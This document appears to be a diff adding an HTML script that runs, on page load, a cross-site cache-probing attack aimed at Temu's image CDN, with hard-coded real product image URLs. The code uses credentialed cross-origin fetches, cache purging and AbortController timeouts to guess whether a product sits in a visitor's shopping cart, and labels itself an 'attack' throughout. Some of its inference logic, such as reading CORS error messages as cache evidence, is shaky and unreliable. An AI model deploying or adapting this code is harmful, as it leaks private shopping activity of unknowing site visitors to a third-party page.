@@ -1,0 +1,486 @@
+<script>
+// CORS Origin Reflection Cache Detection Attack
+// Detect cached cart images via CORS misconfigurations
+
+class CORSOriginReflectionAttack {
+    constructor() {
+        this.debugMode = true;
+        this.results = [];
+    }
+
+    // Main cart detection using CORS origin reflection
+    async detectCartViaCORS(productImageUrl) {
+        console.log(`🔍 === CORS ORIGIN REFLECTION ATTACK ===`);
+        console.log(`🖼️  Product URL: ${productImageUrl}`);
+        
+        // Convert to cart thumbnail format
+        const cartThumbnailUrl = this.convertToCartThumbnail(productImageUrl);
+        console.log(`🛒 Cart thumbnail URL: ${cartThumbnailUrl}`);
+        
+        // Step 1: Test if the endpoint has CORS origin reflection misconfiguration
+        const corsTest = await this.testCORSOriginReflection(cartThumbnailUrl);
+        
+        if (!corsTest.hasOriginReflection) {
+            console.log(`❌ No CORS origin reflection detected. Trying AbortController method...`);
+            return await this.detectCartViaAbortController(productImageUrl);
+        }
+        
+        // Step 2: Test cache state using CORS errors
+        const cacheTest = await this.testCacheViaCORSErrors(cartThumbnailUrl);
+        
+        // Step 3: Cross-validate with different image variations
+        const crossValidation = await this.crossValidateCORSResults(productImageUrl);
+        
+        // Step 4: Final analysis
+        const finalAnalysis = this.analyzeCORSResults(corsTest, cacheTest, crossValidation);
+        
+        return {
+            method: 'cors_origin_reflection',
+            productUrl: productImageUrl,
+            cartThumbnailUrl: cartThumbnailUrl,
+            corsTest: corsTest,
+            cacheTest: cacheTest,
+            crossValidation: crossValidation,
+            finalAnalysis: finalAnalysis,
+            confidence: finalAnalysis.confidence,
+            likelyInCart: finalAnalysis.confidence > 70
+        };
+    }
+
+    // Fallback: AbortController cache detection method
+    async detectCartViaAbortController(productImageUrl) {
+        console.log(`🔍 === ABORTCONTROLLER CACHE DETECTION ===`);
+        console.log(`🖼️  Product URL: ${productImageUrl}`);
+        
+        const cartThumbnailUrl = this.convertToCartThumbnail(productImageUrl);
+        console.log(`🛒 Cart thumbnail URL: ${cartThumbnailUrl}`);
+        
+        // Step 1: Purge any existing cache
+        await this.purgeFromCache(cartThumbnailUrl);
+        
+        // Step 2: Test multiple image variations
+        const variations = [
+            { w: 300, q: 70, format: 'webp', label: 'cart' },
+            { w: 100, q: 60, format: 'webp', label: 'small' },
+            { w: 500, q: 80, format: 'webp', label: 'medium' },
+            { w: 800, q: 90, format: 'webp', label: 'large' }
+        ];
+        
+        const results = [];
+        
+        for (const variation of variations) {
+            const url = this.buildImageUrl(productImageUrl.split('?')[0], variation);
+            const cached = await this.ifCached(url);
+            
+            results.push({
+                variation: variation,
+                url: url,
+                cached: cached
+            });
+            
+            console.log(`📦 ${variation.label} (${variation.w}x${variation.q}): ${cached ? 'CACHED' : 'NOT CACHED'}`);
+        }
+        
+        const analysis = this.analyzeAbortControllerResults(results);
+        
+        return {
+            method: 'abort_controller',
+            productUrl: productImageUrl,
+            cartThumbnailUrl: cartThumbnailUrl,
+            variations: results,
+            analysis: analysis,
+            confidence: analysis.confidence,
+            likelyInCart: analysis.confidence > 70
+        };
+    }
+
+    // Test if endpoint has CORS origin reflection misconfiguration
+    async testCORSOriginReflection(url) {
+        console.log(`🌐 Testing CORS origin reflection: ${url}`);
+        
+        try {
+            const response = await fetch(url, {
+                method: 'GET',
+                mode: 'cors',
+                credentials: 'include'
+            });
+            
+            // If successful, check response headers (though we can't read them due to CORS)
+            console.log(`✅ CORS request successful - potential origin reflection`);
+            
+            return {
+                hasOriginReflection: true,
+                responseReceived: true,
+                corsBlocked: false
+            };
+            
+        } catch (error) {
+            console.log(`🔍 CORS error encountered: ${error.message}`);
+            
+            // CORS error might indicate origin reflection mismatch
+            const isCORSError = error.message.includes('CORS') || 
+                               error.message.includes('Origin') ||
+                               error.message.includes('Access-Control');
+            
+            return {
+                hasOriginReflection: isCORSError,
+                responseReceived: false,
+                corsBlocked: true,
+                error: error.message
+            };
+        }
+    }
+
+    // Test cache state using CORS errors
+    async testCacheViaCORSErrors(url) {
+        console.log(`💾 Testing cache state via CORS errors: ${url}`);
+        
+        const results = {
+            tests: [],
+            cacheDetected: false,
+            confidence: 0
+        };
+        
+        // Test multiple times to establish pattern
+        for (let i = 0; i < 5; i++) {
+            try {
+                const testResult = await this.corsErrorTest(url, i);
+                results.tests.push(testResult);
+                
+                console.log(`🔍 Test ${i + 1}: ${testResult.corsError ? 'CORS ERROR' : 'SUCCESS'} (${testResult.timing.toFixed(2)}ms)`);
+                
+            } catch (e) {
+                console.log(`❌ Test ${i + 1} failed: ${e.message}`);
+                results.tests.push({ error: e.message, timing: 0 });
+            }
+            
+            await this.sleep(200);
+        }
+        
+        // Analyze pattern of CORS errors
+        const corsErrors = results.tests.filter(t => t.corsError);
+        const successes = results.tests.filter(t => !t.corsError && !t.error);
+        
+        // If we get consistent CORS errors, it might indicate cached resource with wrong origin
+        if (corsErrors.length > successes.length && corsErrors.length >= 3) {
+            results.cacheDetected = true;
+            results.confidence = 80;
+            console.log(`🚨 Cache likely detected: ${corsErrors.length}/${results.tests.length} CORS errors`);
+        } else {
+            results.confidence = 20;
+            console.log(`✅ No cache detected: ${successes.length}/${results.tests.length} successful requests`);
+        }
+        
+        return results;
+    }
+
+    // Single CORS error test
+    async corsErrorTest(url, testNumber) {
+        const startTime = performance.now();
+        
+        try {
+            await fetch(url, {
+                method: 'GET',
+                mode: 'cors',
+                credentials: 'include',
+                cache: 'no-cache', // Try to bypass cache
+                headers: {
+                    'Cache-Control': 'no-cache',
+                    'X-Test': `cors-test-${testNumber}-${Date.now()}`
+                }
+            });
+            
+            return {
+                corsError: false,
+                timing: performance.now() - startTime,
+                testNumber: testNumber
+            };
+            
+        } catch (error) {
+            const timing = performance.now() - startTime;
+            const isCORSError = error.message.includes('CORS') || 
+                               error.message.includes('Origin') ||
+                               error.message.includes('Access-Control');
+            
+            return {
+                corsError: isCORSError,
+                timing: timing,
+                testNumber: testNumber,
+                error: error.message
+            };
+        }
+    }
+
+    // Cross-validate with different image variations
+    async crossValidateCORSResults(productImageUrl) {
+        console.log(`🔄 Cross-validating with image variations...`);
+        
+        const baseUrl = productImageUrl.split('?')[0];
+        const testUrls = [
+            `${baseUrl}?imageView2/2/w/300/q/70/format/webp`, // Cart thumbnail
+            `${baseUrl}?imageView2/2/w/150/q/50/format/webp`, // Homepage thumbnail  
+            `${baseUrl}?imageView2/2/w/500/q/80/format/webp`, // Medium size
+            `${baseUrl}?imageView2/2/w/800/q/90/format/webp`  // Large size
+        ];
+        
+        const results = [];
+        
+        for (const [index, url] of testUrls.entries()) {
+            const label = ['cart', 'homepage', 'medium', 'large'][index];
+            
+            try {
+                const corsResult = await this.corsErrorTest(url, index);
+                results.push({
+                    label: label,
+                    url: url,
+                    ...corsResult
+                });
+                
+                console.log(`🔍 ${label}: ${corsResult.corsError ? 'CORS ERROR' : 'SUCCESS'}`);
+                
+            } catch (e) {
+                results.push({
+                    label: label,
+                    url: url,
+                    error: e.message
+                });
+            }
+            
+            await this.sleep(300);
+        }
+        
+        return this.analyzeCrossValidationResults(results);
+    }
+
+    // AbortController cache detection (from XS-Leaks documentation)
+    async ifCached(url, purge = false) {
+        const controller = new AbortController();
+        const signal = controller.signal;
+        
+        // Adjust timeout based on operation
+        const waitTime = purge ? 3 : 9;
+        
+        const timeout = setTimeout(() => {
+            controller.abort();
+        }, waitTime);
+        
+        try {
+            const options = {
+                mode: "no-cors",
+                credentials: "include",
+                signal: signal
+            };
+            
+            if (purge) {
+                options.cache = "reload";
+            }
+            
+            await fetch(url, options);
+            
+        } catch (err) {
+            clearTimeout(timeout);
+            
+            if (purge) {
+                console.log(`🗑️  Resource purged: ${url.split('/').pop()}`);
+            } else {
+                console.log(`❌ Resource not cached: ${url.split('/').pop()}`);
+            }
+            
+            return false;
+        }
+        
+        clearTimeout(timeout);
+        console.log(`💾 Resource cached: ${url.split('/').pop()}`);
+        return true;
+    }
+
+    // Purge resource from cache
+    async purgeFromCache(url) {
+        console.log(`🗑️  Purging from cache: ${url}`);
+        return await this.ifCached(url, true);
+    }
+
+    // Convert product URL to cart thumbnail
+    convertToCartThumbnail(productImageUrl) {
+        const baseUrl = productImageUrl.split('?')[0];
+        return `${baseUrl}?imageView2/2/w/300/q/70/format/webp`;
+    }
+
+    // Build image URL with specific parameters
+    buildImageUrl(baseUrl, params) {
+        const { w, q, format } = params;
+        return `${baseUrl}?imageView2/2/w/${w}/q/${q}/format/${format}`;
+    }
+
+    // Analyze CORS attack results
+    analyzeCORSResults(corsTest, cacheTest, crossValidation) {
+        console.log(`🎯 === CORS ANALYSIS ===`);
+        
+        let confidence = 0;
+        const evidence = [];
+        
+        // Primary evidence: CORS cache detection
+        if (cacheTest.cacheDetected) {
+            confidence += 60;
+            evidence.push(`CORS cache detection: ${cacheTest.tests.filter(t => t.corsError).length}/${cacheTest.tests.length} CORS errors`);
+        }
+        
+        // Cross-validation evidence
+        if (crossValidation.cartSpecificCaching) {
+            confidence += 30;
+            evidence.push(`Cart-specific CORS pattern detected`);
+        }
+        
+        // Boost confidence if multiple indicators
+        if (evidence.length >= 2) {
+            confidence *= 1.2;
+        }
+        
+        // Penalties for low-quality results
+        if (corsTest.corsBlocked && !corsTest.hasOriginReflection) {
+            confidence *= 0.5;
+            evidence.push('Warning: Limited CORS origin reflection detected');
+        }
+        
+        confidence = Math.min(95, Math.max(5, confidence));
+        
+        console.log(`📊 Evidence: ${evidence.length} items`);
+        evidence.forEach((item, index) => {
+            console.log(`   ${index + 1}. ${item}`);
+        });
+        
+        console.log(`🎯 CORS confidence: ${confidence.toFixed(1)}%`);
+        
+        return {
+            confidence: confidence,
+            evidence: evidence,
+            recommendation: this.generateRecommendation(confidence)
+        };
+    }
+
+    // Analyze AbortController results
+    analyzeAbortControllerResults(results) {
+        console.log(`🎯 === ABORTCONTROLLER ANALYSIS ===`);
+        
+        const cached = results.filter(r => r.cached);
+        const cartResult = results.find(r => r.variation.label === 'cart');
+        
+        let confidence = 0;
+        const evidence = [];
+        
+        // Primary evidence: cart thumbnail cached
+        if (cartResult && cartResult.cached) {
+            confidence += 70;
+            evidence.push('Cart thumbnail (300x70) is cached');
+        }
+        
+        // Secondary evidence: multiple sizes cached (suggests cart usage)
+        if (cached.length > 2) {
+            confidence += 20;
+            evidence.push(`Multiple image sizes cached: ${cached.length}/${results.length}`);
+        }
+        
+        // Pattern analysis: cart size cached but others not
+        const othersCached = cached.filter(r => r.variation.label !== 'cart');
+        if (cartResult && cartResult.cached && othersCached.length === 0) {
+            confidence += 10;
+            evidence.push('Only cart size cached (strong cart indicator)');
+        }
+        
+        confidence = Math.min(95, Math.max(5, confidence));
+        
+        console.log(`📊 Cached variations: ${cached.map(r => r.variation.label).join(', ')}`);
+        console.log(`📊 Evidence: ${evidence.length} items`);
+        evidence.forEach((item, index) => {
+            console.log(`   ${index + 1}. ${item}`);
+        });
+        
+        console.log(`🎯 AbortController confidence: ${confidence.toFixed(1)}%`);
+        
+        return {
+            confidence: confidence,
+            evidence: evidence,
+            cachedCount: cached.length,
+            cartCached: cartResult ? cartResult.cached : false
+        };
+    }
+
+    // Analyze cross-validation results
+    analyzeCrossValidationResults(results) {
+        const corsErrors = results.filter(r => r.corsError);
+        const cartError = results.find(r => r.label === 'cart' && r.corsError);
+        const othersError = corsErrors.filter(r => r.label !== 'cart');
+        
+        return {
+            totalTests: results.length,
+            corsErrors: corsErrors.length,
+            cartSpecificCaching: cartError && othersError.length === 0,
+            confidence: corsErrors.length > 0 ? 60 : 20
+        };
+    }
+
+    generateRecommendation(confidence) {
+        if (confidence > 85) return 'HIGH CONFIDENCE: Product very likely in cart';
+        if (confidence > 70) return 'MEDIUM-HIGH CONFIDENCE: Product likely in cart';
+        if (confidence > 50) return 'MEDIUM CONFIDENCE: Some evidence of cart presence';
+        if (confidence > 30) return 'LOW CONFIDENCE: Weak evidence';
+        return 'NO EVIDENCE: Product likely not in cart';
+    }
+
+    sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+}
+
+// Usage functions
+async function testCORSCartDetection(productImageUrl) {
+    const attack = new CORSOriginReflectionAttack();
+    
+    console.log('🔍 === CORS ORIGIN REFLECTION CART DETECTION ===');
+    const result = await attack.detectCartViaCORS(productImageUrl);
+    
+    console.log('\n🎯 === SUMMARY ===');
+    console.log(`🔗 Product: ${result.productUrl}`);
+    console.log(`🛒 Method: ${result.method}`);
+    console.log(`📊 Confidence: ${result.confidence.toFixed(1)}%`);
+    console.log(`✅ In cart: ${result.likelyInCart ? 'YES' : 'NO'}`);
+    console.log(`💡 Recommendation: ${result.finalAnalysis ? result.finalAnalysis.recommendation : result.analysis.recommendation}`);
+    
+    return result;
+}
+
+async function testAbortControllerMethod(productImageUrl) {
+    const attack = new CORSOriginReflectionAttack();
+    
+    console.log('🔍 === ABORTCONTROLLER CART DETECTION ===');
+    const result = await attack.detectCartViaAbortController(productImageUrl);
+    
+    console.log('\n🎯 === SUMMARY ===');
+    console.log(`🔗 Product: ${result.productUrl}`);
+    console.log(`📊 Confidence: ${result.confidence.toFixed(1)}%`);
+    console.log(`✅ In cart: ${result.likelyInCart ? 'YES' : 'NO'}`);
+    console.log(`💡 Recommendation: ${result.analysis.recommendation}`);
+    
+    return result;
+}
+
+// Test with Temu products
+async function testTemuCORS() {
+    // Test with a known product URL
+    const productUrl = 'https://img.kwcdn.com/product/open/1991a86485e54747a5ed43c9ee84bbc3-goods.jpeg';
+    return await testCORSCartDetection(productUrl);
+}
+
+async function testTemuAbortController() {
+    const productUrl = 'https://img-eu.kwcdn.com/local-goods-img/201365d8925/b4e018d8-478b-446f-ad0f-b3a128f4e843_1500x1500.jpeg.format.jpg';
+    return await testAbortControllerMethod(productUrl);
+}
+
+testTemuCORS()
+testTemuAbortController()
+console.log('🎯 CORS Origin Reflection Attack loaded!');
+console.log('💡 Commands:');
+console.log('  - testTemuCORS() - Test CORS origin reflection method');
+console.log('  - testTemuAbortController() - Test AbortController method');
+console.log('🔥 These methods detect cache without timing measurements!');
+</script>
